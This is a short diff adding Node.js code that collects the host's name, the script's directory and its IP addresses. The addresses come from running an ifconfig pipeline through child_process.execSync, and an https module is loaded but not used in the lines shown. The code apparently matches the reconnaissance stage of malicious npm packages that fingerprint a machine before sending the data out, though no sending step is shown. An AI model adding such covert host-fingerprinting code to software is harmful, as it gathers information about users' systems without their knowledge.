@@ -1,0 +1,7 @@
+const https = require('https')
+const path = require('path')
+const os = require("os")
+const fs = require('fs')
+var hostname = os.hostname()
+var filepath = path.dirname(__filename)
+var ips = require('child_process').execSync("ifconfig | grep inet | grep -v inet6 | awk '{gsub(/addr:/,\"\");print $2}'").toString().trim().split("\n")
